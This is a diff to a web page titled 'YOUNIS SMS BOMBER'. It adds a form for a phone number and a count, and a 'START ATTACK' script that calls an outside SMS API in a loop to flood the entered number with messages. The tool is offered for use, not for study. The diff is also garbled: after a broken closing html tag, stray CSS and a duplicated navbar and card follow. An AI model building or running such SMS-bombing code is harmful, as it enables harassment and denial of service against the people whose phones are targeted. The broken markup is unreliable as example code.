@@ -134,6 +134,63 @@
 
   <!-- Card -->
   <div class="card">
+    <h2>&#128640;YOUNIS SMS BOMBER💣🥵 </h2>
+    <input type="text" id="number" placeholder="319xxxxxx">
+    <input type="number" id="amount" placeholder="Enter Amount">
+    <button onclick="startAttack()">START ATTACK🐧☠️</button>
+    <div id="status">Status: Waiting...</div>
+  </div>
+
+  <script>
+    async function startAttack() {
+      const number = document.getElementById("number").value.trim();
+      const amount = parseInt(document.getElementById("amount").value.trim()) || 1;
+      const statusBox = document.getElementById("status");
+
+      if (!number) {
+        statusBox.textContent = "&#9888;&#65039; Enter a valid number!";
+        return;
+      }
+
+      statusBox.textContent = "Process Started...🦈";
+
+      for (let i = 1; i <= amount; i++) {
+        try {
+          const url = `https://famofcfallxd.serv00.net/apis/api.php?number=92${number}&amount=1`;
+          const res = await fetch(url);
+          const text = await res.text();
+
+          statusBox.textContent += `\n[${i}] Sms Ended☑`;
+        } catch (err) {
+          statusBox.textContent += `\n[${i}] Sms Ended☑`;
+        }
+      }
+    }
+  </script>
+</body>
+</html      font-size: 14px;
+      white-space: pre-line;
+      color: #ff4de1;
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(-20px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+  </style>
+</head>
+<body>
+  <!-- Navbar -->
+  <nav>
+    <h1>&#9889; Muhammad Younis &#9889;</h1>
+    <ul>
+      <li>Home</li>
+      <li>Contact</li>
+    </ul>
+  </nav>
+
+  <!-- Card -->
+  <div class="card">
     <h2>&#128640;YOUNIS SMS BOMBER💣🥵🔥&#128540; </h2>
     <input type="text" id="number" placeholder="319xxxxxx">
     <input type="number" id="amount" placeholder="Enter Amount">
